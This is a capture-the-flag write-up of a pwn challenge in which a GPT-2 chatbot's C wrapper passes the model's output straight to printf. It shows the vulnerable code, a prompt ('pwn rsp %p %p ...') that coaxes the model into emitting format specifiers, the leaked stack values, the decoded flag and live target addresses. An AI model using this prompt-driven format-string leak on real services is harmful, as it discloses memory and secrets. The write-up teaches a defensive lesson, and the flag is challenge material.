# ThoughtSlop — Writeup

- **Category:** Pwn
- **Points:** 500
- **Flag:** `rstcon{nuclear_0pti0n_trash_EVERYTHING}`
- **Description:** *With all this AI Slop, I might actually have to* **Use my brain**
  *and start* **Thought Slopping** *to solve this challenge.*
- **Target:** `nc 18.215.143.250 8888` (Mirror 2: `nc 18.145.136.91 8888`)

## TL;DR

The service is stock **GPT-2** (`gpt2.Q8_0.gguf`) run through llama.cpp, wired
up so it prints the model's *generated* text with `printf(output_buf);` — a
textbook **format-string vulnerability**. The flag is read into a stack buffer
in the same function. So the exploit is: **make the LLM "slop" out `%p`
specifiers**, let `printf` walk the stack, and read the flag back as "pointer"
values whose hex decodes to ASCII.

The AI is a red herring (`Use my brain` = the bug is in the C, not in what the
model says); the whole point is to coax the slop generator into emitting format
specifiers (`Thought Slopping`).

## Recon

Connecting drops you into what looks like a chatbot:

```
Welcome to ThoughtSlop!
Welcome Back root!
 > hello
Thinking....

A note on the "Unlock" button. You'll be rewarded with a P-value ...
```

Every input just produces generic "AI slop." Key observations from poking it:

- **Deterministic per prompt.** The same input always yields byte-identical
  output (`root` → identical text twice, typo and all). → greedy/seeded
  sampling.
- **Stateless.** "Continue the story" ignores the previous turn; each prompt is
  independent.
- Asking for the flag, feeding `rstcon{`, the challenge description, jailbreaks,
  etc. — all just produce more slop. The flag is **not** in the model.
- Binary input triggers a tell-tale error: **`llama_decode failed on prompt`** →
  the backend is **llama.cpp**.

The handout (`thought_slop.zip`) confirms the mechanism — and ships a **decoy**
`flag.txt` = `rstcon{nice_flag_bro}` (the real flag is read server-side).

## The vulnerability

From `thoughtful.c`:

```c
void run() {
    char flag[FLAG_SIZE];                 // 48-byte flag buffer on the stack
    char *output_buf = calloc(1, MAX_OUTPUT);
    ...
    read_flag(flag);                      // fgets the real flag into flag[]
    ...
    while (running) {
        fgets(input_buf, BUF_SIZE, stdin);
        // tokenize -> decode -> sample up to MAX_NEW_TOKENS, append pieces:
        strncat(output_buf, piece, cur);
        ...
        printf(output_buf);               // <-- FORMAT STRING BUG (line 165)
        memset(output_buf, 0, MAX_OUTPUT);
    }
}
```

`output_buf` holds the model's generated text and is passed **directly** as the
format string to `printf`. Our raw input is never `printf`'d (the echo we see is
just the `socat` PTY), so we can't inject `%` directly — **the model has to
generate the specifiers for us**. And conveniently, `flag[]` lives on the same
stack frame, reachable through `printf`'s varargs.

Sampler config:

```c
llama_sampler_chain_add(sampler, llama_sampler_init_temp(0.7f));
llama_sampler_chain_add(sampler, llama_sampler_init_dist(42));   // seed 42
```

`run.sh` serves it with `socat ... fork EXEC:"./thoughtful",pty` — **each
connection is a fresh fork**, so the RNG re-seeds to 42 every time. That's why
every prompt's first generation is deterministic and reproducible.

## Thought Slopping the specifiers

GPT-2 is stubborn: priming it with raw `%p %p %p …` makes it "correct" the text
into code (`printf("%s", __func__);`) and it emits *zero* real specifiers.
Man-page / reference-listing primers fail too.

What works is a **pwn/debug-flavoured** prefix that nudges the model into a
register/stack-dump idiom and keeps it echoing `%p`:

```
pwn rsp %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
```

The model slops out lines like `rsp_set_vcs_mode %p 0x%p …`, and `printf`
interprets each generated `%p`, dumping stack qwords:

```
0x1 0x55a7f52f1010 0x55a2af4a52e3 0xa0 ... (nil) (nil) ...
0x55a7f536afe8 0x55a7f5347540 0x55a7f5362280
0x6e7b6e6f63747372 0x305f7261656c6375 0x72745f6e30697470 ...
```

Those last values aren't pointers — they're the **flag bytes**. The flag is a
run of consecutive qwords whose bytes are all printable ASCII. Decode each as
little-endian:

| leaked qword          | little-endian ASCII |
| --------------------- | ------------------- |
| `0x6e7b6e6f63747372`  | `rstcon{n`          |
| `0x305f7261656c6375`  | `uclear_0`          |
| `0x72745f6e30697470`  | `pti0n_tr`          |
| `0x524556455f687361`  | `ash_EVER`          |
| `0x7d474e49485459`    | `YTHING}`           |

Concatenated:

```
rstcon{nuclear_0pti0n_trash_EVERYTHING}
```

Generation is capped at `MAX_NEW_TOKENS = 128`, and the flag qwords land near
that cutoff, so the trick is just getting a prompt whose deterministic `%p` run
reaches them before the limit. A couple of prefix variants (`pwn rsp`,
`pwn esp`) both land it; two independent triggers agreeing is the confirmation.

## Solve

`solves/thought-slop/solve.py` — fires the trigger prompts, parses the leaked
`%p`/`(nil)` stream into bytes, and extracts the flag:

```
$ python3 solves/thought-slop/solve.py
trigger: 'pwn rsp %p %p %p %p ...'
FLAG = rstcon{nuclear_0pti0n_trash_EVERYTHING}
```

## Flag

```
rstcon{nuclear_0pti0n_trash_EVERYTHING}
```

## Takeaways

- `printf(user_influenced_buffer)` is a format-string bug **even when the
  "user" is a language model** — never pass generated/untrusted text as a format
  string; use `printf("%s", buf)`.
- An LLM in front of a classic memory-corruption bug is still just a classic
  memory-corruption bug. The model is the *delivery mechanism* for `%p`, not the
  puzzle. `Use my brain` meant: ignore the slop, read the C.
- Per-connection `fork` + fixed sampler seed made the whole thing deterministic,
  which is what let a one-shot leak work reliably.
